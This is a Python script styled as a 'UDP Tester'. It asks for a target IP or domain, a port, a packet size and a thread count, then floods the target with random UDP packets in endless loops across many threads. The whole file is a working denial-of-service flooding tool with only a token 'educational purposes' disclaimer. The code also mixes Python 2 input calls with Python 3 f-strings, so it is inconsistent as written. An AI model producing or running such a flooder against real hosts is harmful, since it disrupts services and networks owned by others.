#!/usr/bin/env python2

import os
import time
import socket
import random
import threading
import sys
import ipaddress

os.system("clear")

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def send_packets(ip, port, packet_size, packets_per_connection):
    data = random._urandom(packet_size)
    while True:
        try:
            print("\033[1;31m[*]\033[0m \033[1mSending UDP packets to\033[0m " f"\033[1;38;2;255;100;100m{ip}\033[0m" ":" f"\033[1;38;2;255;100;100m{port}\033[1;37m""!")
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for _ in range(packets_per_connection):
                s.sendto(data, addr)
            s.close()
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)
        except Exception as e:
            sys.exit("\033[1;31m[!]\033[0m " f"\033[1;37m{e}\033[0m"".")

def main():
    print("")
    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
    print("")
    print("\033[1;31m[Warning]\033[1;37m This tool is for educational purposes \nonly, I am not responsible for any damages you \nhave caused or may cause, use it at your own risk!")
    print("")

    while True:
        try:
            target = raw_input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target IP or domain:\033[0m ")
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP or domain.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    if not is_valid_ipv4(target):
        try:
            ip = socket.gethostbyname(target)
            print(f"\033[1;31m[+]\033[0m Resolved \033[1;38;2;255;100;100m{target}\033[0m to \033[1;38;2;255;100;100m{ip}\033[1;37m")
        except socket.error as e:
            print("\033[1;31m[!]\033[0m \033[1;37mError resolving the target: {}\033[0m".format(e))
            sys.exit(1)
    else:
        ip = target

    while True:
        try:
            port = int(raw_input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target port: \033[0m "))
            break
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the port.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            packet_size = int(raw_input("\033[1;31m[#]\033[0m ""\033[1;37mEnter packet size (bytes): \033[0m "))
            if packet_size > 0 and packet_size <= 65507:
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Packet size must be between 1 and 65507 bytes.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packet size.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            packets_per_connection = int(raw_input("\033[1;31m[#]\033[0m ""\033[1;37mEnter packets per connection: \033[0m "))
            if packets_per_connection > 0:
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Packets per connection must be a positive integer.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for packets per connection.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    while True:
        try:
            num_threads = int(raw_input("\033[1;31m[#]\033[0m ""\033[1;37mEnter number of threads: \033[0m "))
            if num_threads > 0:
                break
            else:
                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Number of threads must be a positive integer.\033[0m")
        except ValueError:
            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the number of threads.\033[0m")
        except KeyboardInterrupt:
            print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
            sys.exit(0)

    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets, args=(ip, port, packet_size, packets_per_connection))
        thread.start()

if __name__ == "__main__":
    main()
